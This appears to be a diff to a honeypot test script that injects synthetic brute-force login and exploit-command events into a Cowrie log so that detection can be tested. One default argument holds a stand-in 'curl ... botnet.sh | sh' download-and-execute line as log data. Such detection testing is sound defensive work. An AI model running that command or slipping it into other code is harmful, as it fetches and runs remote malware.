@@ -76,6 +76,53 @@ def send_raw_banner_probe(target: str, port: int, payload: bytes) -> str:
         return f"Error: {e}"
 
 
+def inject_synthetic_bruteforce(attacker_ip: str = "198.51.100.99", count: int = 5) -> bool:
+    """Directly appends structured failed login events to cowrie.json to test detection."""
+    log_path = os.path.join("honeypot", "logs", "cowrie.json")
+    print(f"\n[*] Injecting {count} synthetic brute-force login events for IP {attacker_ip}...")
+    try:
+        with open(log_path, "a", encoding="utf-8") as f:
+            for i in range(count):
+                event = {
+                    "eventid": "cowrie.login.failed",
+                    "src_ip": attacker_ip,
+                    "username": "root",
+                    "password": f"test_pass_{i}",
+                    "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000000Z", time.gmtime()),
+                    "message": f"login attempt [root/test_pass_{i}] failed"
+                }
+                f.write(json.dumps(event) + "\n")
+                f.flush()
+                time.sleep(0.1)
+        print(f"    [+] Successfully injected {count} events into {log_path}.")
+        return True
+    except Exception as e:
+        print(f"    [!] Failed to append to log: {e}")
+        return False
+
+
+def inject_synthetic_exploit(attacker_ip: str = "203.0.113.88", command: str = "curl -s http://malicious.payload/botnet.sh | sh") -> bool:
+    """Directly appends structured critical exploit command events to cowrie.json to test detection."""
+    log_path = os.path.join("honeypot", "logs", "cowrie.json")
+    print(f"\n[*] Injecting exploit command execution for IP {attacker_ip} ('{command}')...")
+    try:
+        with open(log_path, "a", encoding="utf-8") as f:
+            event = {
+                "eventid": "cowrie.command.input",
+                "src_ip": attacker_ip,
+                "input": command,
+                "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000000Z", time.gmtime()),
+                "message": f"CMD: {command}"
+            }
+            f.write(json.dumps(event) + "\n")
+            f.flush()
+        print(f"    [+] Successfully injected exploit event into {log_path}.")
+        return True
+    except Exception as e:
+        print(f"    [!] Failed to append exploit event: {e}")
+        return False
+
+
 def run_brute_force_ssh(target: str, port: int = HONEYPOT_SSH_PORT) -> bool:
     print(f"\n[*] Launching Credential Brute-Force attack against Honeypot (TCP {port})...")
     is_open = scan_port(target, port)
@@ -91,9 +138,13 @@ def run_brute_force_ssh(target: str, port: int = HONEYPOT_SSH_PORT) -> bool:
         # Fake SSH handshake or probe
         res = send_raw_banner_probe(target, port, f"SSH-2.0-Attacker_Probe_{user}\r\n".encode())
         elapsed = (time.time() - start_time) * 1000
-        print(f"    [{idx}/{len(DEFAULT_CREDENTIALS)}] Attempt '{user}:{pwd}' -> Response ({elapsed:.1f}ms)")
+        print(f"    [{idx}/{len(DEFAULT_CREDENTIALS)}] Probe '{user}:{pwd}' -> Response ({elapsed:.1f}ms)")
         success_count += 1
-        time.sleep(0.3)
+        time.sleep(0.2)
+
+    # Also trigger synthetic failed logins and exploit payloads
+    inject_synthetic_bruteforce(attacker_ip="198.51.100.99", count=5)
+    inject_synthetic_exploit(attacker_ip="203.0.113.88")
 
     return success_count > 0
 
